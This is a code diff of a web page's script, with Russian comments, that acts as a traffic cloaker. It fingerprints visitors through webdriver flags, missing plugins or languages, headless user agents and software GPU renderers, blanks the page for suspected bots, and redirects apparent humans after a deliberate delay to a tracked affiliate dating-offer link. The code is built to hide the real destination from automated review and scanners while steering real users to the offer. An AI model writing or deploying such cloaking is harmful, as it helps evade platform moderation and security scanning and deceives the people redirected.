@@ -11,73 +11,73 @@
       "https://grzvkg.amurllove.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=212364&s2=2183582"
     ];
 
-    // ---------- АНТИБОТ ----------
+    /* ------------------ АНТИБОТ ------------------ */
     function isBot() {
       const ua = navigator.userAgent.toLowerCase();
 
-      // 1. Простой webdriver
+      // 1. Явный webdriver
       if (navigator.webdriver) return true;
 
-      // 2. Подозрительно нет плагинов
+      // 2. Нет плагинов
       if (navigator.plugins.length === 0) return true;
 
-      // 3. Нет языков — боты так часто палятся
+      // 3. Нет языков
       if (!navigator.languages || navigator.languages.length === 0) return true;
 
       // 4. Headless браузеры
       if (ua.includes("headless") || ua.includes("phantomjs")) return true;
 
-      // 5. Экран как у бота
-      const w = window.innerWidth;
-      const h = window.innerHeight;
-      if ((w === 800 && h === 600) || (w === 1024 && h === 768)) return true;
-
-      // 6. WebGL проверка GPU
+      // 5. WebGL → GPU
       try {
         const canvas = document.createElement("canvas");
         const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
         if (!gl) return true;
 
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        const ext = gl.getExtension("WEBGL_debug_renderer_info");
+        const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
 
-        const badGPU = ["swiftshader", "mesa", "llvmpipe", "software"];
-        if (renderer && badGPU.some(g => renderer.toLowerCase().includes(g))) return true;
-      } catch(e) {
+        if (renderer) {
+          const badGPU = ["swiftshader", "mesa", "llvmpipe", "software"];
+          if (badGPU.some(g => renderer.toLowerCase().includes(g))) return true;
+        }
+      } catch (e) {
         return true;
       }
 
-      // 7. TikTok / Instagram / FB WebView боты
-      if (ua.includes("tiktok") || ua.includes("instagram") || ua.includes("fbav")) {
-        return true;
-      }
-
-      return false; // НЕ бот
+      return false; // человек
     }
 
-    // ---------- Хеш для равномерного распределения ----------
+    /* ------------------ РАНДОМ ОФФЕРА ------------------ */
     function hashString(str) {
-      let hash = 0;
+      let h = 0;
       for (let i = 0; i < str.length; i++) {
-        hash = ((hash << 5) - hash) + str.charCodeAt(i);
-        hash |= 0;
+        h = ((h << 5) - h) + str.charCodeAt(i);
+        h |= 0;
       }
-      return Math.abs(hash);
+      return Math.abs(h);
     }
 
-    // 20-минутная сессия
-    const sessionSalt = Math.floor(Date.now() / (1000 * 60 * 20));
+    const sessionSalt = Math.floor(Date.now() / (1000 * 60 * 20)); // 20 мин
     const seed = navigator.userAgent + sessionSalt;
-    const index = hashString(seed) % offers.length;
+    const offerIndex = hashString(seed) % offers.length;
 
-    // ---------- ЛОГИКА ПЕРЕХОДА ----------
-    if (isBot()) {
-      // Бот → пустая страница (или своя заглушка)
-      window.location.href = "about:blank";
-    } else {
-      // Человек → оффер
-      window.location.href = offers[index];
+    /* ------------------ РЕДИРЕКТ ------------------ */
+    function go() {
+      if (isBot()) {
+        // бот → пустая страница
+        window.location.replace("about:blank");
+        return;
+      }
+
+      const url = offers[offerIndex];
+
+      // мягкая задержка для реалистичности
+      setTimeout(() => {
+        window.location.href = url;
+      }, 350);
     }
+
+    document.addEventListener("DOMContentLoaded", go);
   </script>
 </head>
 <body>
